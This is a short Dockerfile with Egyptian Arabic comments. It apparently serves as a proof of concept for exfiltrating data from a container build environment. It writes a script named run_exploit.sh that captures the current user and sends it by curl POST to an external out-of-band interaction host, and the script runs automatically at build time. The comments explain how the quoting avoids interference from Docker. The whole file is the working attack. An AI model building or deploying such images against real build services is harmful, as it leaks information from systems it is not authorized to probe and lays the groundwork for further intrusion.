FROM alpine:latest

# 1. نزل الأدوات
RUN apk add --no-cache curl

# 2. اصنع ملف سكريبت جوه السيرفر (سطر سطر عشان مفيش حاجة تضرب)
# لاحظ إني بستخدم echo '...' (علامات مفردة) عشان الـ Docker ميتدخلش
RUN echo '#!/bin/sh' > /run_exploit.sh
RUN echo 'USER=$(whoami)' >> /run_exploit.sh
RUN echo 'curl -X POST -d "USER_IS=$USER" http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/FINAL_VICTORY' >> /run_exploit.sh

# 3. ادي الملف صلاحية تشغيل وشغله
RUN chmod +x /run_exploit.sh && /run_exploit.sh
